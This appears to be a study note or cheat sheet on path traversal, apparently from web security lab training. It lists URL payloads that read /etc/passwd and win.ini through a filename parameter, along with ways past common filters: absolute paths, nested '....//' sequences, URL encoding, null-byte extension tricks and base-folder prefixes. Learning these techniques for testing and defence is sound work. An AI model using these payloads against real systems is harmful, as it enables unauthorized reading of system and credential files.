# Path traversal
From /www/var/html to root and then to etc/passwd
```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```
Windows:
```
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```
Sometimes we need to open image in new tab to see correct URL to exploit PT  
And sometimes Burp Proxy doesn't show images, so we need to change its filters

## Bypassing defence techiques
Sometimes we aren't able to use relative path, so we can try absolutte path to nexploit PT  
```
filename=/etc/passwd
```
Another way is nested traversals such as `....//` or `....\/`. The yrevert to simple traversals, when stripped by server (and the one of protection methods is stripping request by certain characters).
```
filename=....//....//....//etc//passwd
```
We can URL encode or double URL encode payload. For such cases we can use Burp Intruder payload list Fuzzing - Path traversal.  
App may require to end file with certain extension (such as .jpg). We can bypasss it with null byte+extension (%00.extension)
```
filename=../../../etc/passwd%00.png
```
Also app may require to start with certain base folder such as /var/www/html. Bypassing:
```
filename=/var/www/images/../../../etc/passwd
```